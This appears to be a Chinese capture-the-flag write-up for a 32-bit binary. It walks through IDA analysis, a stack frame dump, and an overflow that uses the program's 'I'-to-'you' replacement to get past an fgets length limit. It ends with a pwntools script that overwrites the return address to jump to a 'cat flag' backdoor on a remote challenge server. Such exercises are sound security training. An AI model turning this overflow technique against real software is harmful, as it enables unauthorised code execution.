# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107685467-a88811a3-a772-43b0-b3bd-694c11724ab5.png)

# 做法

开虚拟机，checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107794551-87d0a4a0-d536-4303-b804-265f9db9170a.png)

32位，还是没开栈保护

扔进IDA（32位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107858181-85dba884-c6c8-476a-afbf-f86fe8826cbc.png)

没有啥，点进去vuln看看

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107918986-ebe15892-8b0b-4c4f-a2e9-789e53d37525.png)

眼花缭乱，先按Shift+F12打开string窗口，一键找出所有的字符串，看看有啥

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744108031639-0df56937-1e63-48af-82ba-8bb4c07ab3c9.png)

诶，有个cat flag，点进去，然后Ctrl+x，确定

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744108187207-a6180a22-2216-4a78-b8ef-89260ff26e30.png)

按Tab转成c语言看下

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744108241896-e1ee9973-03b2-4d5a-ab34-dc9ac8b55eda.png)

喔，后门函数这不找到了嘛，然后回去看看vuln函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107918986-ebe15892-8b0b-4c4f-a2e9-789e53d37525.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

我们看到第12行的fgets函数，这是我们的输入点，限制在32个字符

不熟悉这个函数，求助一下AI：

1、可导致栈溢出

2、在正常使用时，`n` 代表要读取的最大字符数（包含字符串结束符 `'\0'`），`fgets` 会保证最多读取 `n - 1` 个字符到 `str` 所指向的缓冲区中，并在末尾添加 `'\0'`

（即这题的fgets函数限制是在31个字符）

点进fgets函数括号里的s看下，完整代码如下

s对应第37行的s

```
-00000058 ; D/A/*   : change type (data/ascii/array)
-00000058 ; N       : rename
-00000058 ; U       : undefine
-00000058 ; Use data definition commands to create local variables and function arguments.
-00000058 ; Two special fields " r" and " s" represent return address and saved registers.
-00000058 ; Frame size: 58; Saved regs: 4; Purge: 0
-00000058 ;
-00000058
-00000058                 db ? ; undefined
-00000057                 db ? ; undefined
-00000056                 db ? ; undefined
-00000055                 db ? ; undefined
-00000054                 db ? ; undefined
-00000053                 db ? ; undefined
-00000052                 db ? ; undefined
-00000051                 db ? ; undefined
-00000050                 db ? ; undefined
-0000004F                 db ? ; undefined
-0000004E                 db ? ; undefined
-0000004D                 db ? ; undefined
-0000004C                 db ? ; undefined
-0000004B                 db ? ; undefined
-0000004A                 db ? ; undefined
-00000049                 db ? ; undefined
-00000048                 db ? ; undefined
-00000047                 db ? ; undefined
-00000046                 db ? ; undefined
-00000045                 db ? ; undefined
-00000044                 db ? ; undefined
-00000043                 db ? ; undefined
-00000042                 db ? ; undefined
-00000041                 db ? ; undefined
-00000040                 db ? ; undefined
-0000003F                 db ? ; undefined
-0000003E                 db ? ; undefined
-0000003D                 db ? ; undefined
-0000003C s               db ?
-0000003B                 db ? ; undefined
-0000003A                 db ? ; undefined
-00000039                 db ? ; undefined
-00000038                 db ? ; undefined
-00000037                 db ? ; undefined
-00000036                 db ? ; undefined
-00000035                 db ? ; undefined
-00000034                 db ? ; undefined
-00000033                 db ? ; undefined
-00000032                 db ? ; undefined
-00000031                 db ? ; undefined
-00000030                 db ? ; undefined
-0000002F                 db ? ; undefined
-0000002E                 db ? ; undefined
-0000002D                 db ? ; undefined
-0000002C                 db ? ; undefined
-0000002B                 db ? ; undefined
-0000002A                 db ? ; undefined
-00000029                 db ? ; undefined
-00000028                 db ? ; undefined
-00000027                 db ? ; undefined
-00000026                 db ? ; undefined
-00000025                 db ? ; undefined
-00000024                 db ? ; undefined
-00000023                 db ? ; undefined
-00000022                 db ? ; undefined
-00000021                 db ? ; undefined
-00000020                 db ? ; undefined
-0000001F                 db ? ; undefined
-0000001E                 db ? ; undefined
-0000001D                 db ? ; undefined
-0000001C var_1C          db ?
-0000001B                 db ? ; undefined
-0000001A                 db ? ; undefined
-00000019                 db ? ; undefined
-00000018 var_18          db ?
-00000017                 db ? ; undefined
-00000016                 db ? ; undefined
-00000015                 db ? ; undefined
-00000014                 db ? ; undefined
-00000013                 db ? ; undefined
-00000012                 db ? ; undefined
-00000011 var_11          db ?
-00000010 var_10          db ?
-0000000F                 db ? ; undefined
-0000000E                 db ? ; undefined
-0000000D                 db ? ; undefined
-0000000C                 db ? ; undefined
-0000000B                 db ? ; undefined
-0000000A                 db ? ; undefined
-00000009 var_9           db ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

得知，s到r的大小为0x3C-4+4+4=64，后门函数也有了

因此，这里我们考虑构造栈溢出，但是因为fgets函数限制了输入字符

64>31，因此我们不能直接塞字节数据进去，

我们回到vuln函数，继续往下看，看到you，I 还有replace（替换）![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744107918986-ebe15892-8b0b-4c4f-a2e9-789e53d37525.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0%2Fresize%2Cw_1125%2Climit_0)

于是我们想到——在限制输入字符的情况下填满它，就得把 I 换成you

算一下要换多少个——64/3=21余1（换21个，然后塞一个字节数据进去就可以了）

（注：换20个，然后塞4个字节数据等等也是可以的，自己换下试试，我这里试到换18个，塞10个字节数据进去就得不出flag了，正常来说输入字符范围在31个以内都可以的，也许fgets函数里本来就有些东西吧，就像你分一个200G的盘，它的可用内存总没有200G一般）

【遇到这种换字符的不知道要用总数除以多少的，被除数 可以用you（1个要换成的字符长度）除以 I （1个要被换的字符长度）得出（即3/1也就是3）】

至此，我们构造exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744112676743-f7145a5b-adb7-4d22-939d-39c3d33dbf24.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29891)

#定义 payload
payload = b'I' * 21 + b'a' * 1 + p32(0x8048F0D)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

得出flag

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744112622366-49a89c94-b204-4aca-a139-ba5bf8773821.png)

# 更新

于2025.4.8